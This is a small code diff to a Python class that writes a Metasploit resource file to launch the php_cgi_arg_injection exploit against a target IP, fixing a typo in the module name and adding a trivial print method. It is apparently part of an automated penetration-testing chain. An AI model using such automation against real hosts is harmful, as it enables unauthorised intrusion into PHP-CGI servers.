@@ -45,7 +45,7 @@ class Function():
         match = Default # set default first
 
         configFile=open('meta.rc','w')
-        configFile.write('nuse exploit/multi/http/php_cgi_arg_injectio\n')
+        configFile.write('use exploit/multi/http/php_cgi_arg_injection\n')
         configFile.write(f"set RHOST {func_in['IP']}\n")
         configFile.write('run\n')
         configFile.write('exit\n')
@@ -59,3 +59,7 @@ class Function():
             print(outputLine)        
         
         return Data, match
+    
+    def print_something(func_in, Data):
+        print("class chain is running~~")
+        return Data, False
